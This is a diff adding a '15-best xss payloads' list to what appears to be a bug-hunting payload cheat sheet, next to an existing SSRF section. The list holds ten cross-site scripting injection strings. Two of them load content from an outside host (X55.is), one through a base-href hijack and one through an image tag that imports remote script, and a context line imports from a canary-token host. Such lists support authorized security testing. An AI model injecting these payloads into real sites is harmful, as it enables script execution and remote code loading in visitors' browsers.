@@ -162,6 +162,19 @@ Quoteless JSi
 ```
 -'"><Svg Src=//{CANARY_TOKEN}/s OnLoad=import(this.getAttribute('src')+0)>
 ```
+15-best xss payloads
+```
+<Base Href=//X55.is>
+2. <K OnPointerRawUpdate=alert(1)>
+3. \’/alert(1)//
+4. JavaScript:alert(1)
+5. ‘-alert(1)-’
+6. <Script>alert(1)</Script>
+7. <K ContentEditable AutoFocus OnFocus=alert(1)>
+8. “AutoFocus OnFocus=alert(1)//
+9. <Svg OnLoad=alert(1)>
+10. <Img Src=//X55.is OnLoad=import(src)>
+```
 # SSRF
 1-Try other URL schemes:<br>
 ```
